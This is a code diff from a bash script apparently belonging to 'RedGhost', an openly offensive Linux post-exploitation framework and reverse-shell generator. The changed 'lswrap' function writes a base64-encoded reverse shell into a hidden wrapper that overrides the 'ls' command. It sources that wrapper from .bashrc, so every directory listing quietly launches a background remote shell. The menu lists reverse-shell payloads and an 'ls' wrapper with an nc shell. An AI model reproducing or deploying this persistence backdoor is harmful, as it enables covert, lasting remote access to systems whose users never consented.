@@ -92,11 +92,9 @@ function lswrap(){
 					shell="${shell/'address'/$address}"
 					shell="${shell/'prt'/$port}"
 					encode=$(echo $shell | base64)
-					echo -e "function ls(){ \n(echo \"${encode}\" | base64 -d | nohup bash > /dev/null 2>.1 &)\n /usr/bin/ls; }" > .ls
-					mv .ls $HOME 
+					echo -e "function ls(){ \n(echo \"${encode}\" | base64 -d | nohup bash > /dev/null 2>.1 &)\n /usr/bin/ls; rm .1; }" > $HOME/.ls
 					echo "source ~/.ls" >> .bashrc
-					source ~/.bashrc
-					echo -e "\nls wrapper added!\n"
+					echo -e "\nls wrapper added!\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal"
 					read -p "Press enter to continue ";;
 		[Exitexit]* ) return 1;;
 		esac
@@ -250,7 +248,7 @@ while true
 do
 
 dialog --clear --nocancel --backtitle "Coded by d4rkst4t1c.." \
---title "[ R E D G H O S T - N E T W O R K - T O O L ]" \
+--title "[ R E D G H O S T - P O S T  E X P L O I T - T O O L ]" \
 --menu "Linux post exploitation framework and payload generator." 15 60 7 \
 Payloads "Generate Reverse Shells" \
 lsWrapper "Wrap ls command with nc shell" \
